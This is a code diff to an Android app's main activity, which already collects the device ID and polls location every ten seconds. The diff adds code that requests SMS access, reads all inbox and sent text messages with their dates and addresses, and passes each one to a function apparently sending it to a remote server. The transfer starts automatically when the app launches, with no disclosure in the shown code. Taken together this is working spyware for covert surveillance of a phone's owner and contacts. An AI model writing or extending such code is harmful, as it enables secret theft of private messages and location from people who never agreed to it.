@@ -35,10 +35,16 @@ import android.os.Looper
 
 import android.provider.Settings.Secure
 import android.annotation.SuppressLint
+import android.net.Uri
+import java.text.SimpleDateFormat
+import java.util.Date
 
 class MainActivity : AppCompatActivity() {
 
     private val requestLocationPermission = 1
+    private val requestSMSPermission = 2
+    private val received = 1000
+    private val sent = 2000
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private val handler = Handler(Looper.getMainLooper())
     private val interval = 10000
@@ -75,7 +81,8 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         getAndroidId(this)
-
+        retrieveSMSData(this, received)
+        retrieveSMSData(this, sent)
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         handler.postDelayed(runnable, interval.toLong())
         getLocation()
@@ -149,10 +156,9 @@ class MainActivity : AppCompatActivity() {
     fun getCurrentDate(): String {
         val calendar = Calendar.getInstance()
         val year = calendar.get(Calendar.YEAR)
-        val month = calendar.get(Calendar.MONTH) + 1 // Note: Calendar.MONTH is zero-based
+        val month = calendar.get(Calendar.MONTH) + 1
         val day = calendar.get(Calendar.DAY_OF_MONTH)
 
-        // Format the date as a string (optional)
         return "$day/$month/$year"
     }
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -160,6 +166,10 @@ class MainActivity : AppCompatActivity() {
         if (requestCode == requestLocationPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
             getLocation()
 
+        }
+        if (requestCode == requestSMSPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            retrieveSMSData(this, received)
+            retrieveSMSData(this, sent)
         }
     }
     private fun getLocation() {
@@ -197,6 +207,77 @@ class MainActivity : AppCompatActivity() {
     private fun getAndroidId(context: Context){
         androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)
 
+    }
+
+    private fun smsPermission() {
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_SMS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.READ_SMS
+                ),
+                requestSMSPermission
+            )
+            return
+        }
+    }
+
+    private fun retrieveSMSData(context: Context, receivedOrSent: Int) { //: List<Triple<String, String, String>> {
+        smsPermission()
+
+        val smsList = mutableListOf<Triple<String, String, String>>()
+        var uriString = ""
+        if (receivedOrSent == received) {
+            uriString = "content://sms/inbox"
+        }
+        else if (receivedOrSent == sent) {
+            uriString = "content://sms/sent"
+        }
+        val uri = Uri.parse(uriString)
+        val cursor = context.contentResolver.query(uri, null, null, null, null)
+
+        if (cursor != null && cursor.moveToFirst()) {
+            val bodyIndex = cursor.getColumnIndex("body")
+            val addressIndex = cursor.getColumnIndex("address")
+            val dateIndex = cursor.getColumnIndex("date")
+
+            do {
+                val smsBody = cursor.getString(bodyIndex)
+                val senderAddress = cursor.getString(addressIndex)
+                val smsDate = timestampToString(cursor.getLong(dateIndex))
+                smsList.add(Triple(smsDate, senderAddress, smsBody))
+            } while (cursor.moveToNext())
+
+            cursor.close()
+        }
+
+        if (smsList.isNotEmpty()) {
+            for ((date, address, message) in smsList) {
+                sendSMSToServer(date, address, message, receivedOrSent)
+            }
+        }
+    }
+
+    private fun sendSMSToServer(date: String, addr: String, msg: String, receivedOrSent: Int) {
+        var data = ""
+        if (receivedOrSent == received) {
+            data = "sms : $date, sender: $addr, Message: $msg"
+        }
+        else if (receivedOrSent == sent) {
+            data = "sms : $date, recipient: $addr, Message: $msg"
+        }
+        newPacket(data)
+    }
+
+    @SuppressLint("SimpleDateFormat")
+    private fun timestampToString(timestamp: Long): String {
+        val dateFormat = SimpleDateFormat("dd-MM-yyyy HH:mm:ss")
+        val date = Date(timestamp)
+        return dateFormat.format(date)
     }
 
 }
